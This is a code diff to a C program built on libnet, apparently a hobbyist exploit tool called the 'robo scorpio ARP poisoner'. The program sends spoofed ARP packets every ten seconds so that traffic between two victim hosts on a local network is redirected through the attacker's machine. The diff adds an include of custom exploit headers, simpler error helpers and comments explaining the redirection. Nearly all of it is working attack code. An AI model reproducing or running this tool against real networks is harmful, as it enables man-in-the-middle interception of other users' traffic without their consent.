@@ -3,7 +3,9 @@
 #include <libnet.h>
 #include <string.h>
 #include <time.h>
-//#include "arpv2.h"
+#include "../SEHT-Headers/exp.h"
+
+//Complile with -lnet flag to include libnet from custom exp headers
 
 int main(int argc, char* argv[])
 {
@@ -27,34 +29,29 @@ int main(int argc, char* argv[])
 	struct libnet_ether_addr* mac_attacker;
 	u_int8_t* mac_attacker_octet;
 
-	printf("Welcome to the robo scorpio poisoner [0.0]_/ Robo scorpio says \"STINGGGGG :)\"\n\n");
+	printf("Welcome to the robo scorpio ARP poisoner [0.0]_/ Robo scorpio says \"STINGGGGG :)\"\v");
 
 	if(argc < 4)
-	{
-		perror("usage: device victim1IP victim2IP victim2MACOCTET");
-		exit(404);
-	}
+		exp_error("[USAGE]: <device> <victim1IP> <victim2IP> <victim2MACOCTET>", 1);
 
 	printf("Initializing...\nDevice is %s\n", device);
 	libnet_t* lib_nt = libnet_init(LIBNET_LINK, device, errbuff);
 	if(lib_nt == NULL)
-	{
-		perror("Could not start LIBNET, try running with root priviledges");
-		exit(1);
-	}
+		exp_error("Could not start LIBNET, try running with root priviledges", 2);
 
+	//Get our IP ADDR to redirect traffic to us
 	printf("Getting your IP...\n");
 	ip_attacker_network = libnet_get_ipaddr4(lib_nt);
 	printf("Your IP got @ %x\n", ip_attacker_network);
-	//Convert ip to network bytes
+
+	//Convert victim ips to network bytes
 	ip_victim_network = libnet_name2addr4(lib_nt, argv[2], LIBNET_DONT_RESOLVE); //0
 	printf("Victim1's IP is %s as hex %x\n", argv[2], ip_victim_network);
 	ip_destination_network = libnet_name2addr4(lib_nt, argv[3], LIBNET_DONT_RESOLVE); //0
 	printf("Victim2's IP is %s as hex %x\n", argv[3], ip_destination_network);
 
+	//Get destination MAC address from supplied mac argument
 	int size_mac = 17;
-	//printf("Please enter the Victim2's MAC address\n");
-	//fscanf(stdin, "%17s", mac_destination);
 	mac_destination_network = libnet_hex_aton(argv[4], &size_mac);
 
 	printf("Getting required MAC addresses...\n");
@@ -66,25 +63,17 @@ int main(int argc, char* argv[])
 	libnet_ptag_t ip_hdr = libnet_autobuild_ethernet(mac_destination_network, 0x806, lib_nt);
 
 	if(arp_hdr == -1 || ip_hdr == -1)
-	{
-		perror("Could not build packet");
-		exit(2);
-	}
+		exp_error("Could not build packet\n", 3);
 
 	for(;;)
 	{
 		printf("Executing Poisoning...\n");
 		if(libnet_write(lib_nt) == -1)
-		{
-			perror("Unable to write packet");
-			exit(3);
-		}
+			exp_error("Unable to write packet", 4);
 		else
-			printf("Success\n");
+			printf("[STING!] Poison packet sent\n");
 		sleep(10);
 	}
-
-	//Manipulate Gateway
 	libnet_destroy(lib_nt);
 	libnet_close_link(lib_nt);
 	return 0;
